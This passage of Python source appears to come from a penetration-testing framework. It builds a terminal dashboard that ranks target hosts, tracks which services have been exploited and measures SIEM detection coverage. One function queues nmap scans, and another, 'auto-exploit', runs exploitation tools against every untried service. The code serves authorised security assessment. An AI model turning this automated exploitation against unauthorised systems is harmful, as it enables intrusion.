#!/usr/bin/env python3
"""
Intelligence Hub UI.
Unified attack surface dashboard with host-centric analysis and exploitation tracking.

Host-centric view: Clean main table showing hosts, with drill-down for details.
Consolidates Intelligence View, Exploit Suggestions, and Attack Correlation.
"""

import shutil
from typing import Any, Dict, List, Set

import click


def get_terminal_width() -> int:
    """Get terminal width."""
    return shutil.get_terminal_size().columns


def _get_detection_summary(engagement_id: int) -> Dict[str, Any]:
    """Get detection validation summary for the engagement.

    Returns dict with:
    - enabled: bool - whether Wazuh is configured
    - total: int - total attacks validated
    - detected: int - attacks that triggered alerts
    - not_detected: int - attacks with no alerts (gaps)
    - coverage_pct: float - detection coverage percentage
    - gaps: List[Dict] - detection gap details
    """
    try:
        from souleyez.integrations.wazuh.config import WazuhConfig
        from souleyez.storage.database import get_db

        # Check if Wazuh is configured
        config = WazuhConfig.get_config(engagement_id)
        if not config or not config.get("enabled"):
            return {"enabled": False}

        # Get detection results from database
        db = get_db()
        conn = db.get_connection()
        cursor = conn.cursor()

        # Count by status
        cursor.execute(
            """
            SELECT detection_status, COUNT(*) as count
            FROM detection_results
            WHERE engagement_id = ?
            GROUP BY detection_status
        """,
            (engagement_id,),
        )

        status_counts = {row[0]: row[1] for row in cursor.fetchall()}

        detected = status_counts.get("detected", 0)
        not_detected = status_counts.get("not_detected", 0)
        partial = status_counts.get("partial", 0)
        offline = status_counts.get("offline", 0)

        # Total countable (exclude offline/unknown)
        total = detected + not_detected + partial
        coverage_pct = round((detected / total * 100), 1) if total > 0 else 0.0

        # Get detection gaps (not_detected attacks)
        cursor.execute(
            """
            SELECT dr.id, dr.attack_type, dr.target_ip, dr.attack_start,
                   el.command
            FROM detection_results dr
            LEFT JOIN execution_log el ON el.id = dr.job_id
            WHERE dr.engagement_id = ? AND dr.detection_status = 'not_detected'
            ORDER BY dr.checked_at DESC
            LIMIT 20
        """,
            (engagement_id,),
        )

        gaps = []
        for row in cursor.fetchall():
            gaps.append(
                {
                    "id": row[0],
                    "attack_type": row[1],
                    "target_ip": row[2],
                    "attack_time": row[3],
                    "command": row[4],
                }
            )

        return {
            "enabled": True,
            "total": total,
            "detected": detected,
            "not_detected": not_detected,
            "partial": partial,
            "offline": offline,
            "coverage_pct": coverage_pct,
            "gaps": gaps,
        }

    except Exception:
        return {"enabled": False}


def _get_host_detection_stats(engagement_id: int, target_ip: str) -> Dict[str, Any]:
    """Get detection stats for a specific host.

    Returns dict with detected/not_detected counts for this IP.
    """
    try:
        from souleyez.storage.database import get_db

        db = get_db()
        conn = db.get_connection()
        cursor = conn.cursor()

        cursor.execute(
            """
            SELECT detection_status, COUNT(*) as count
            FROM detection_results
            WHERE engagement_id = ? AND target_ip = ?
            GROUP BY detection_status
        """,
            (engagement_id, target_ip),
        )

        status_counts = {row[0]: row[1] for row in cursor.fetchall()}

        detected = status_counts.get("detected", 0)
        not_detected = status_counts.get("not_detected", 0)
        total = detected + not_detected

        return {
            "detected": detected,
            "not_detected": not_detected,
            "total": total,
            "coverage_pct": round((detected / total * 100), 1) if total > 0 else None,
        }
    except Exception:
        return {"detected": 0, "not_detected": 0, "total": 0, "coverage_pct": None}


def view_attack_surface(engagement_id: int):
    """Display Intelligence Hub - unified attack surface dashboard.

    Consolidates Intelligence View, Exploit Suggestions, and Attack Correlation
    into a single host-centric view with drill-down capabilities.

    Main view shows hosts table with exploitation status.
    Drill-down to see services, findings, and exploits for each host.

    Args:
        engagement_id: The engagement ID
    """
    from rich.console import Console
    from rich.table import Table

    from souleyez.intelligence.surface_analyzer import AttackSurfaceAnalyzer
    from souleyez.storage.engagements import EngagementManager
    from souleyez.ui.design_system import DesignSystem

    em = EngagementManager()
    analyzer = AttackSurfaceAnalyzer()

    engagement = em.get_by_id(engagement_id)
    if not engagement:
        click.echo(click.style("Error: Engagement not found", fg="red"))
        click.pause()
        return

    # State
    selected_host_ids = set()  # Track selected hosts for multi-select
    host_page = 0  # Current page (0-indexed)
    host_page_size = 20  # Hosts per page
    view_all_hosts = False  # Toggle to show all hosts without pagination
    host_filter = None  # Filter by status: None, 'exploited', 'partial', 'none'

    # Analyze once before entering loop
    click.echo(click.style("\n🔍 Analyzing attack surface...", fg="yellow", bold=True))
    try:
        analysis = analyzer.analyze_engagement(engagement_id)
    except Exception as e:
        click.echo(click.style(f"Error analyzing: {e}", fg="red"))
        click.pause()
        return

    # Get detection summary (Wazuh integration)
    detection_summary = _get_detection_summary(engagement_id)

    while True:
        DesignSystem.clear_screen()
        console = Console()

        # Header
        width = DesignSystem.get_terminal_width()
        click.echo("\n┌" + "─" * (width - 2) + "┐")
        click.echo(
            "│"
            + click.style(" INTELLIGENCE HUB ".center(width - 2), bold=True, fg="cyan")
            + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Summary line
        overview = analysis["overview"]
        hosts = analysis["hosts"]
        total_hosts = len(hosts)
        total_services = overview.get("total_services", 0)
        exploited_services = overview.get("exploited_services", 0)
        gap_count = total_services - exploited_services

        # Build host data for table (include detection stats if Wazuh enabled)
        host_data = _build_host_data(
            hosts, engagement_id if detection_summary.get("enabled") else None
        )

        # Apply filter
        filtered_hosts = host_data
        if host_filter:
            filtered_hosts = [h for h in host_data if h["status_type"] == host_filter]

        # Calculate pagination
        total_host_pages = max(
            1, (len(filtered_hosts) + host_page_size - 1) // host_page_size
        )
        host_page = min(host_page, total_host_pages - 1)

        # Summary line with pagination
        page_info = (
            f"Page {host_page + 1}/{total_host_pages}" if not view_all_hosts else "All"
        )

        # Build summary with optional detection stats
        summary_parts = [
            f"Hosts: {total_hosts}",
            f"Services: {total_services}",
            f"✅ Exploited: {exploited_services}",
            f"⚠️ Gaps: {gap_count}",
        ]

        # Add detection coverage if Wazuh is configured
        if detection_summary.get("enabled") and detection_summary.get("total", 0) > 0:
            det_pct = detection_summary["coverage_pct"]
            det_color = (
                "green" if det_pct >= 75 else "yellow" if det_pct >= 50 else "red"
            )
            det_display = click.style(f"{det_pct}%", fg=det_color)
            summary_parts.append(f"🛡️ Detected: {det_display}")

        summary_parts.append(page_info)

        click.echo("📊 SUMMARY")
        click.echo("  " + "  │  ".join(summary_parts))

        # Top Target callout (highest priority host)
        if hosts:
            top = hosts[0]  # Already sorted by score
            top_ip = top.get("host", "unknown")
            top_hostname = top.get("hostname", "")
            top_score = top.get("score", 0)
            top_services = top.get("services", [])
            top_exploited = sum(
                1 for s in top_services if s.get("status") == "exploited"
            )
            top_total_svc = len(top_services)
            top_critical = top.get("critical_findings", 0)
            top_findings = top.get("findings", 0)
            # Estimate high severity as remaining findings after critical
            top_high = (
                max(0, top_findings - top_critical)
                if top_findings > top_critical
                else 0
            )

            top_display = f"{top_ip}"
            if top_hostname:
                top_display += f" ({top_hostname})"

            click.echo()
            click.echo(
                click.style("🎯 TOP TARGET: ", fg="yellow", bold=True)
                + click.style(top_display, fg="white", bold=True)
            )
            click.echo(
                f"   Score: {top_score} pts  │  {top_exploited}/{top_total_svc} services exploited  │  ",
                nl=False,
            )
            if top_critical > 0:
                click.echo(click.style(f"{top_critical} critical", fg="red"), nl=False)
                if top_high > 0:
                    click.echo(f", {top_high} high findings", nl=False)
                else:
                    click.echo(" findings", nl=False)
            elif top_high > 0:
                click.echo(f"{top_high} high findings", nl=False)
            else:
                click.echo("0 critical findings", nl=False)
            click.echo()

        click.echo()

        # Display host table with pagination and selection
        show_detection = (
            detection_summary.get("enabled", False)
            and detection_summary.get("total", 0) > 0
        )
        host_page, total_host_pages = _display_hosts_table(
            console,
            filtered_hosts,
            selected_host_ids,
            host_page,
            host_page_size,
            view_all_hosts,
            host_filter,
            width,
            show_detection=show_detection,
        )

        # Menu
        _display_host_menu(
            width,
            selected_host_ids,
            host_filter,
            view_all_hosts,
            total_host_pages,
            engagement_id,
        )

        try:
            choice = input("\n  Select option: ").strip().lower()

            if choice == "q":
                return
            elif choice == "i" and filtered_hosts:
                # Interactive mode for host selection
                from souleyez.ui.interactive_selector import interactive_select

                host_items = [
                    {
                        "id": h["id"],
                        "host": h["display_name"],
                        "services": h["service_count"],
                        "findings": h["findings_display"],
                        "exploited": h["exploited_display"],
                        "status": h["status_icon"],
                    }
                    for h in filtered_hosts
                ]

                columns = [
                    {"name": "Host", "width": 30, "key": "host"},
                    {"name": "Services", "width": 10, "key": "services"},
                    {"name": "Findings", "width": 15, "key": "findings"},
                    {"name": "Exploited", "width": 12, "key": "exploited"},
                    {"name": "Status", "width": 8, "key": "status"},
                ]

                interactive_select(
                    items=host_items,
                    columns=columns,
                    selected_ids=selected_host_ids,
                    get_id=lambda h: h["id"],
                    title="SELECT HOSTS",
                )

                # Show bulk action menu if hosts selected
                if selected_host_ids:
                    result = _host_bulk_action_menu(
                        engagement_id, filtered_hosts, selected_host_ids, analysis
                    )
                    if result == "clear":
                        selected_host_ids.clear()
                continue
            elif choice == "a":
                # Toggle view all hosts
                view_all_hosts = not view_all_hosts
                if not view_all_hosts:
                    host_page = 0
                continue
            elif (
                choice == "n"
                and not view_all_hosts
                and host_page < total_host_pages - 1
            ):
                host_page += 1
                continue
            elif choice == "p" and not view_all_hosts and host_page > 0:
                host_page -= 1
                continue
            elif choice == "w":
                # Quick Wins - show easy exploits
                _view_quick_wins(engagement_id, analysis)
                continue
            elif choice == "g":
                # Switch to gap-centric view
                _view_gaps_centric(engagement_id, analysis, engagement)
                continue
            elif choice == "z":
                # Vulnerabilities view (SIEM-specific)
                from souleyez.integrations.wazuh.config import WazuhConfig

                config = WazuhConfig.get_config(engagement_id)
                siem_type = config.get("siem_type", "wazuh") if config else "wazuh"
                if siem_type == "splunk":
                    from souleyez.ui.splunk_vulns_view import show_splunk_vulns_view

                    show_splunk_vulns_view(engagement_id, engagement.get("name", ""))
                else:
                    from souleyez.ui.wazuh_vulns_view import show_wazuh_vulns_view

                    show_wazuh_vulns_view(engagement_id, engagement.get("name", ""))
                continue
            elif choice == "y":
                # Gap Analysis (SIEM-specific)
                from souleyez.integrations.wazuh.config import WazuhConfig

                config = WazuhConfig.get_config(engagement_id)
                siem_type = config.get("siem_type", "wazuh") if config else "wazuh"
                if siem_type == "splunk":
                    from souleyez.ui.splunk_gap_analysis_view import (
                        show_splunk_gap_analysis_view,
                    )

                    show_splunk_gap_analysis_view(
                        engagement_id, engagement.get("name", "")
                    )
                else:
                    from souleyez.ui.gap_analysis_view import show_gap_analysis_view

                    show_gap_analysis_view(engagement_id, engagement.get("name", ""))
                continue
            elif choice == "f":
                # Filter by status
                host_filter = _select_host_status_filter()
                host_page = 0
                continue
            elif choice == "x":
                export_attack_surface_report(engagement_id, engagement, analysis)
            elif choice == "r":
                # Refresh analysis
                click.echo(click.style("\n🔍 Refreshing analysis...", fg="yellow"))
                try:
                    analysis = analyzer.analyze_engagement(engagement_id)
                except Exception as e:
                    click.echo(click.style(f"Error: {e}", fg="red"))
                    click.pause()
                continue
            elif choice == "d":
                # Detection Validation (all SIEM types)
                from souleyez.integrations.wazuh.config import WazuhConfig

                config = WazuhConfig.get_config(engagement_id)
                if config and config.get("enabled"):
                    from souleyez.ui.interactive import _validate_detections

                    _validate_detections(engagement_id)
                else:
                    click.echo(
                        click.style(
                            "  SIEM not configured. Go to Settings > SIEM Integration.",
                            fg="yellow",
                        )
                    )
                    click.pause()
                continue
            elif choice == "s":
                # View all SIEM alerts (all SIEM types)
                from souleyez.integrations.wazuh.config import WazuhConfig

                config = WazuhConfig.get_config(engagement_id)
                if config and config.get("enabled"):
                    from souleyez.ui.interactive import _view_wazuh_alerts

                    _view_wazuh_alerts(engagement_id)
                else:
                    click.echo(
                        click.style(
                            "  SIEM not configured. Go to Settings > SIEM Integration.",
                            fg="yellow",
                        )
                    )
                    click.pause()
                continue
            elif choice == "l":
                # Last alerts for selected host (Splunk/Elastic/Sentinel)
                from souleyez.integrations.wazuh.config import WazuhConfig

                config = WazuhConfig.get_config(engagement_id)
                siem_type = config.get("siem_type") if config else None
                if (
                    config
                    and config.get("enabled")
                    and siem_type in ("splunk", "elastic", "sentinel")
                ):
                    if selected_host_ids:
                        # Use first selected host
                        host = next(
                            (h for h in filtered_hosts if h["id"] in selected_host_ids),
                            None,
                        )
                        if host:
                            _show_host_siem_alerts(
                                engagement_id, host["host_ip"], siem_type
                            )
                    else:
                        # Prompt for host number
                        try:
                            host_num = click.prompt("  Enter host number", type=int)
                            if 1 <= host_num <= len(filtered_hosts):
                                host = filtered_hosts[host_num - 1]
                                _show_host_siem_alerts(
                                    engagement_id, host["host_ip"], siem_type
                                )
                            else:
                                click.echo(
                                    click.style("  Invalid host number", fg="red")
                                )
                                click.pause()
                        except (ValueError, click.Abort):
                            pass
                continue
            elif choice == "?":
                # Show help
                _show_help()
                continue
            elif choice.isdigit():
                # View host details by number
                host_idx = int(choice) - 1
                if 0 <= host_idx < len(filtered_hosts):
                    _view_host_detail(engagement_id, filtered_hosts[host_idx], analysis)
                else:
                    click.echo(click.style("  Invalid host number", fg="red"))
                    click.pause()

        except (KeyboardInterrupt, EOFError):
            return


def _show_host_siem_alerts(engagement_id: int, host_ip: str, siem_type: str):
    """Show recent SIEM alerts for a specific host."""
    from datetime import datetime, timedelta

    from rich.console import Console
    from rich.table import Table

    from souleyez.integrations.siem.factory import SIEMFactory
    from souleyez.integrations.wazuh.config import WazuhConfig
    from souleyez.ui.design_system import DesignSystem
    from souleyez.ui.interactive import render_standard_header

    DesignSystem.clear_screen()
    click.echo()

    siem_names = {"splunk": "Splunk", "elastic": "Elastic", "sentinel": "Sentinel"}
    siem_name = siem_names.get(siem_type, "SIEM")

    render_standard_header(f"{siem_name.upper()} ALERTS - {host_ip}")
    click.echo()

    config = WazuhConfig.get_config(engagement_id)
    if not config:
        click.echo(click.style("  SIEM not configured", fg="red"))
        click.pause()
        return

    try:
        client = SIEMFactory.create(siem_type, config)
        end_time = datetime.now()
        start_time = end_time - timedelta(hours=24)

        click.echo(f"  Searching for alerts involving {host_ip}...")
        click.echo()

        # Query alerts with host as source or destination
        alerts = client.get_alerts(
            start_time=start_time, end_time=end_time, source_ip=host_ip, limit=50
        )

        # Also get alerts where host is destination
        dest_alerts = client.get_alerts(
            start_time=start_time, end_time=end_time, dest_ip=host_ip, limit=50
        )

        # Combine and dedupe
        all_alerts = alerts + [
            a for a in dest_alerts if a.id not in [x.id for x in alerts]
        ]

        if not all_alerts:
            click.echo(
                click.style(
                    f"  No alerts found for {host_ip} in the last 24 hours", fg="yellow"
                )
            )
            click.echo()
            click.pause()
            return

        click.echo(f"  Found {len(all_alerts)} alerts")
        click.echo()

        console = Console()
        table = Table(
            show_header=True,
            header_style="bold cyan",
            box=DesignSystem.TABLE_BOX,
            padding=(0, 1),
            expand=True,
        )

        table.add_column("Time", width=20)
        table.add_column("Severity", width=10)
        table.add_column("Rule", width=20)
        table.add_column("Description", width=50)

        def get_severity_icon(sev):
            sev = sev.lower() if sev else "info"
            if sev == "critical":
                return "🔴"
            elif sev == "high":
                return "🟡"
            elif sev == "medium":
                return "🔵"
            else:
                return "⚪"

        for alert in all_alerts[:20]:
            ts = alert.timestamp
            if hasattr(ts, "strftime"):
                ts = ts.strftime("%Y-%m-%d %H:%M")
            severity = alert.severity or "info"
            icon = get_severity_icon(severity)
            rule = (alert.rule_name or alert.rule_id or "-")[:20]
            desc = (alert.description or "-")[:50]

            table.add_row(str(ts)[:20], f"{icon} {severity.upper()[:8]}", rule, desc)

        console.print(table)

        if len(all_alerts) > 20:
            click.echo(f"\n  Showing 20 of {len(all_alerts)} alerts")

    except Exception as e:
        click.echo(click.style(f"  Error querying SIEM: {str(e)}", fg="red"))

    click.echo()
    click.pause()


def _show_help():
    """Display help guide for Attack Correlation view."""
    from souleyez.ui.design_system import DesignSystem

    DesignSystem.clear_screen()
    width = get_terminal_width()

    click.echo("\n┌" + "─" * (width - 2) + "┐")
    click.echo(
        "│"
        + click.style(
            " INTELLIGENCE HUB - HELP ".center(width - 2), bold=True, fg="cyan"
        )
        + "│"
    )
    click.echo("└" + "─" * (width - 2) + "┘")
    click.echo()

    click.echo(click.style("  NAVIGATION", bold=True, fg="yellow"))
    click.echo("  ─" * 20)
    click.echo("  [#]     View host details (enter number)")
    click.echo("  [n/p]   Next/Previous page")
    click.echo("  [i]     Interactive mode - select multiple hosts with checkboxes")
    click.echo("  [t]     Toggle view all hosts (disable pagination)")
    click.echo()

    click.echo(click.style("  VIEWS", bold=True, fg="yellow"))
    click.echo("  ─" * 20)
    click.echo("  [q]     Quick Wins - easy exploits with MSF modules")
    click.echo("  [g]     Switch to Gap-centric view (services not yet exploited)")
    click.echo("  [f]     Filter hosts by exploitation status")
    click.echo()

    click.echo(click.style("  ACTIONS", bold=True, fg="yellow"))
    click.echo("  ─" * 20)
    click.echo("  [x]     Export attack surface report")
    click.echo("  [r]     Refresh analysis data")
    click.echo("  [q]     Back to main menu")
    click.echo()

    click.echo(click.style("  HOST DETAIL VIEW", bold=True, fg="yellow"))
    click.echo("  ─" * 20)
    click.echo("  When viewing a host, you can:")
    click.echo("  [v]     View service details")
    click.echo("  [i]     Interactive mode - select multiple services")
    click.echo("  [g]     View all exploitation gaps")
    click.echo("  [f]     View all findings for the host")
    click.echo("  [x]     View all exploit suggestions")
    click.echo("  [s]     Scan more - run additional scans")
    click.echo("  [e]     Exploit - run suggested exploits")
    click.echo()

    click.echo(click.style("  PROGRESS BAR", bold=True, fg="yellow"))
    click.echo("  ─" * 20)
    click.echo(
        "  ████████ 3/3   "
        + click.style("Green", fg="green")
        + "  - Fully exploited (75%+)"
    )
    click.echo(
        "  ██░░░░░░ 2/8   "
        + click.style("Yellow", fg="yellow")
        + " - Partially exploited"
    )
    click.echo(
        "  ░░░░░░░░ 0/5   "
        + click.style("Dim", fg="bright_black")
        + "    - Not started"
    )
    click.echo()

    click.pause()


def _build_host_data(hosts: List[Dict], engagement_id: int = None) -> List[Dict]:
    """Build host data for table display.

    Args:
        hosts: List of host analysis dicts
        engagement_id: Optional engagement ID for detection stats (Wazuh)

    Returns list of host dicts with:
    - id: host IP (unique identifier)
    - display_name: IP with hostname if available
    - service_count: number of services
    - findings_total: total findings count
    - findings_critical: critical findings count
    - findings_display: formatted string like "42 (6🔴)"
    - exploited_count: number exploited
    - total_services: total services
    - exploited_display: formatted string like "5/24"
    - status_icon: ✓ (all exploited), ◐ (partial), ✗ (none)
    - status_type: 'exploited', 'partial', 'none'
    - score: priority score (higher = more critical target)
    - detection_stats: dict with detected/not_detected/coverage_pct (if Wazuh enabled)
    - detection_display: formatted string like "67%" or "-"
    """
    host_data = []

    for host in hosts:
        host_ip = host.get("host", "unknown")
        hostname = host.get("hostname", "")

        # Display name
        if hostname:
            display_name = f"{host_ip} ({hostname})"
        else:
            display_name = host_ip

        # Services and exploitation
        services = host.get("services", [])
        service_count = len(services)
        exploited_count = sum(1 for s in services if s.get("status") == "exploited")

        # Findings
        findings_total = host.get("findings", 0)
        findings_critical = host.get("critical_findings", 0)

        if findings_critical > 0:
            findings_display = f"{findings_total} ({findings_critical}🔴)"
        else:
            findings_display = str(findings_total)

        # Exploited display with progress bar
        if service_count > 0:
            pct = int((exploited_count / service_count) * 100)
            bar_filled = int((exploited_count / service_count) * 8)
            bar_empty = 8 - bar_filled
            progress_bar = "█" * bar_filled + "░" * bar_empty
            exploited_display = f"{progress_bar} {exploited_count}/{service_count}"
        else:
            exploited_display = "░░░░░░░░ 0/0"

        # Status
        if service_count == 0:
            status_icon = "✗"
            status_type = "none"
        elif exploited_count == service_count:
            status_icon = "✓"
            status_type = "exploited"
        elif exploited_count > 0:
            status_icon = "◐"
            status_type = "partial"
        else:
            status_icon = "✗"
            status_type = "none"

        # Detection stats (Wazuh integration)
        detection_stats = None
        detection_display = "-"
        if engagement_id:
            detection_stats = _get_host_detection_stats(engagement_id, host_ip)
            if detection_stats.get("total", 0) > 0:
                pct = detection_stats["coverage_pct"]
                detection_display = f"{pct}%"

        host_data.append(
            {
                "id": host_ip,
                "host_ip": host_ip,
                "hostname": hostname,
                "display_name": display_name,
                "service_count": service_count,
                "services": services,
                "findings_total": findings_total,
                "findings_critical": findings_critical,
                "findings_display": findings_display,
                "exploited_count": exploited_count,
                "total_services": service_count,
                "exploited_display": exploited_display,
                "status_icon": status_icon,
                "status_type": status_type,
                "score": host.get("score", 0),
                "raw_host": host,
                "detection_stats": detection_stats,
                "detection_display": detection_display,
            }
        )

    # Sort by score (highest first)
    host_data.sort(key=lambda h: -h["score"])
    return host_data


def _display_hosts_table(
    console,
    hosts: List[Dict],
    selected_ids: set,
    page: int,
    page_size: int,
    view_all: bool,
    status_filter,
    width: int,
    show_detection: bool = False,
) -> tuple:
    """Display hosts table with pagination and checkboxes.

    Args:
        show_detection: If True, show detection coverage column (Wazuh integration)

    Returns: (current_page, total_pages)
    """
    from rich.table import Table

    from souleyez.ui.design_system import DesignSystem

    # Show active filter
    if status_filter:
        filter_labels = {
            "exploited": "✓ Fully Exploited",
            "partial": "◐ Partially Exploited",
            "none": "✗ Not Exploited",
        }
        click.echo(
            click.style(
                f"  🔍 Filter: {filter_labels.get(status_filter, status_filter)}",
                fg="cyan",
            )
        )
        click.echo()

    if not hosts:
        click.echo("  " + click.style("No hosts found!", fg="yellow"))
        click.echo()
        return 0, 1

    # Pagination
    total_pages = max(1, (len(hosts) + page_size - 1) // page_size)
    page = min(page, total_pages - 1)

    if view_all:
        page_hosts = hosts
    else:
        start_idx = page * page_size
        end_idx = min(start_idx + page_size, len(hosts))
        page_hosts = hosts[start_idx:end_idx]

    # Create Rich table
    table = Table(
        show_header=True,
        header_style="bold cyan",
        box=DesignSystem.TABLE_BOX,
        padding=(0, 1),
        expand=True,
    )

    table.add_column("○", width=3, justify="center")  # Checkbox
    table.add_column("#", width=4, justify="right")
    table.add_column("Host", no_wrap=True)
    table.add_column("Score", width=6, justify="center")
    table.add_column("Services", width=9, justify="center")
    table.add_column("Findings", width=12, justify="center")
    table.add_column("Exploited", width=18, justify="left")
    if show_detection:
        table.add_column("🛡️ Det", width=8, justify="center")  # Detection column

    for idx, host in enumerate(page_hosts):
        # Calculate display index
        if view_all:
            display_idx = idx + 1
        else:
            display_idx = (page * page_size) + idx + 1

        # Checkbox
        checkbox = "●" if host["id"] in selected_ids else "○"

        # Score with color coding (higher = more critical)
        score = host.get("score", 0)
        if score >= 80:
            score_display = f"[red]{score}[/red]"
        elif score >= 60:
            score_display = f"[yellow]{score}[/yellow]"
        elif score >= 40:
            score_display = f"[white]{score}[/white]"
        else:
            score_display = f"[dim]{score}[/dim]"

        # Findings with critical highlight
        if host["findings_critical"] > 0:
            findings_display = (
                f"{host['findings_total']} ([red]{host['findings_critical']}🔴[/red])"
            )
        else:
            findings_display = str(host["findings_total"])

        # Color the progress bar based on exploitation progress
        exploited_pct = (
            (host["exploited_count"] / host["service_count"] * 100)
            if host["service_count"] > 0
            else 0
        )
        if exploited_pct >= 75:
            exploited_display = f"[green]{host['exploited_display']}[/green]"
        elif exploited_pct > 0:
            exploited_display = f"[yellow]{host['exploited_display']}[/yellow]"
        else:
            exploited_display = f"[dim]{host['exploited_display']}[/dim]"

        # Detection coverage display
        if show_detection:
            det_display = host.get("detection_display", "-")
            if det_display != "-":
                det_stats = host.get("detection_stats", {})
                det_pct = det_stats.get("coverage_pct", 0) if det_stats else 0
                if det_pct >= 75:
                    det_display = f"[green]{det_display}[/green]"
                elif det_pct >= 50:
                    det_display = f"[yellow]{det_display}[/yellow]"
                elif det_pct > 0:
                    det_display = f"[red]{det_display}[/red]"
                else:
                    det_display = f"[dim]{det_display}[/dim]"
            else:
                det_display = "[dim]-[/dim]"

        # Build row
        row_data = [
            checkbox,
            str(display_idx),
            host["display_name"],
            score_display,
            str(host["service_count"]),
            findings_display,
            exploited_display,
        ]
        if show_detection:
            row_data.append(det_display)

        table.add_row(*row_data)

    console.print("  ", table)

    # Tip line
    click.echo()
    click.echo("  💡 TIP: Press 'i' for interactive mode")
    if total_pages > 1:
        click.echo("  n/p: Next/Previous page")
    click.echo()

    return page, total_pages


def _display_host_menu(
    width: int,
    selected_ids: set,
    status_filter,
    view_all: bool,
    total_pages: int,
    engagement_id: int = None,
):
    """Display menu for host-centric view."""
    click.echo("─" * width)
    click.echo()

    # Selection info
    if selected_ids:
        click.echo(
            click.style(
                f"  Selected: {len(selected_ids)} host(s)", fg="cyan", bold=True
            )
        )
        click.echo()

    click.echo("  [#] View host details")
    if view_all:
        click.echo("  [a] All - Show paginated view")
    else:
        click.echo("  [a] All - Toggle pagination")
    click.echo("  [w] Quick Wins - Easy exploits")
    click.echo("  [g] Gaps - Gap-centric view")

    # Show SIEM-specific options based on configured SIEM type
    if engagement_id:
        from souleyez.integrations.wazuh.config import WazuhConfig

        config = WazuhConfig.get_config(engagement_id)
        siem_type = config.get("siem_type", "wazuh") if config else None
        siem_names = {
            "wazuh": "Wazuh",
            "splunk": "Splunk",
            "elastic": "Elastic",
            "sentinel": "Sentinel",
        }
        siem_name = siem_names.get(siem_type, "SIEM")
        if config and config.get("enabled"):
            # Common SIEM options (all types)
            click.echo(f"  [d] Detection Validation - {siem_name} alert coverage")
            click.echo(f"  [s] {siem_name} Alerts - View recent alerts")
            # SIEM-specific vulnerability and analysis options
            if siem_type == "wazuh":
                click.echo("  [z] Wazuh Vulns - Agent-detected CVEs")
                click.echo("  [y] Wazuh Gap Analysis - Passive vs Active")
            elif siem_type == "splunk":
                click.echo("  [z] Splunk Vulns - CVEs synced from Wazuh")
                click.echo("  [y] Splunk Gap Analysis - Passive vs Active")
                click.echo("  [l] Last Alerts - Recent alerts for host")
            elif siem_type in ("elastic", "sentinel"):
                click.echo("  [l] Last Alerts - Recent alerts for host")

    click.echo("  [q] Back")


def _select_host_status_filter() -> str:
    """Prompt user to select host status filter."""
    click.echo()
    click.echo(click.style("  Filter by Status:", bold=True))
    click.echo("    [1] ✓ Fully Exploited")
    click.echo("    [2] ◐ Partially Exploited")
    click.echo("    [3] ✗ Not Exploited")
    click.echo("    [0] Clear filter")
    click.echo()

    try:
        choice = input("  Select option: ").strip()
        filter_map = {"1": "exploited", "2": "partial", "3": "none"}
        return filter_map.get(choice)
    except (KeyboardInterrupt, EOFError):
        return None


def _host_bulk_action_menu(
    engagement_id: int, hosts: List[Dict], selected_ids: set, analysis: Dict
) -> str:
    """Show inline bulk action menu for selected hosts."""
    from rich.console import Console

    console = Console()

    selected_hosts = [h for h in hosts if h["id"] in selected_ids]

    if not selected_hosts:
        return "continue"

    console.print()
    console.print(f"  [bold]Selected: {len(selected_hosts)} host(s)[/bold]")
    console.print("    \\[v] View details")
    console.print("    \\[s] Scan selected hosts")
    console.print("    \\[e] Auto-exploit untried services")
    console.print("    \\[x] Export to file")
    console.print("    \\[c] Clear selection")
    console.print("    \\[q] Back")
    console.print()

    try:
        choice = (
            click.prompt("  Select option", default="q", show_default=False)
            .strip()
            .lower()
        )

        if choice == "v":
            # View details of first selected host
            host = selected_hosts[0]
            if len(selected_hosts) > 1:
                click.echo(
                    click.style(
                        f"\n  Showing details for: {host['display_name']}", fg="cyan"
                    )
                )
                click.echo(
                    click.style(
                        f"  ({len(selected_hosts) - 1} other host(s) also selected)",
                        fg="bright_black",
                    )
                )
            _view_host_detail(engagement_id, host, analysis)
            return "continue"

        elif choice == "s":
            # Queue scans for selected hosts
            from souleyez.engine.background import enqueue_job

            queued = 0
            for host in selected_hosts:
                try:
                    enqueue_job(
                        tool="nmap",
                        target=host["host_ip"],
                        args=["-sV", "-sC"],
                        label=f"Scan: {host['host_ip']}",
                        engagement_id=engagement_id,
                    )
                    queued += 1
                except Exception:
                    pass
            click.echo(click.style(f"\n  ✓ Queued {queued} scan job(s)", fg="green"))
            click.pause()
            return "clear"

        elif choice == "e":
            # Auto-exploit untried services
            from souleyez.engine.background import enqueue_job

            queued = 0
            for host in selected_hosts:
                for service in host.get("services", []):
                    if service.get("status") == "not_tried":
                        tool = suggest_tool_for_service(
                            service.get("service") or "unknown"
                        )
                        if tool:
                            try:
                                enqueue_job(
                                    tool=tool,
                                    target=host["host_ip"],
                                    args=["-p", str(service["port"])],
                                    label=f"Exploit: {service.get('service', 'unknown')}",
                                    engagement_id=engagement_id,
                                )
                                queued += 1
                            except Exception:
                                pass
            click.echo(click.style(f"\n  ✓ Queued {queued} job(s)", fg="green"))
            click.pause()
            return "clear"

        elif choice == "x":
            # Export to CSV
            import os
            from datetime import datetime

            output_dir = os.path.expanduser("~/.souleyez/exports")
            os.makedirs(output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(output_dir, f"hosts_export_{timestamp}.csv")

            with open(filepath, "w") as f:
                f.write("Host,Hostname,Services,Findings,Critical,Exploited,Status\n")
                for host in selected_hosts:
                    f.write(
                        f"{host['host_ip']},{host['hostname']},{host['service_count']},"
                        f"{host['findings_total']},{host['findings_critical']},"
                        f"{host['exploited_display']},{host['status_type']}\n"
                    )

            click.echo(click.style(f"\n  ✓ Exported to {filepath}", fg="green"))
            click.pause()

        elif choice == "c":
            return "clear"

    except (KeyboardInterrupt, EOFError):
        pass

    return "continue"


def _view_gap_detail(engagement_id: int, gap: Dict, analysis: Dict):
    """View detailed information for a single exploitation gap."""
    from rich.console import Console

    from souleyez.ui.design_system import DesignSystem

    console = Console()

    while True:
        DesignSystem.clear_screen()
        width = get_terminal_width()

        # Header
        click.echo("\n┌" + "─" * (width - 2) + "┐")
        title = f" GAP: {gap['host']}:{gap['port']} ({gap['service']}) "
        click.echo(
            "│" + click.style(title.center(width - 2), bold=True, fg="yellow") + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Severity indicator
        severity_colors = {
            "critical": "red",
            "high": "yellow",
            "medium": "white",
            "low": "bright_black",
        }
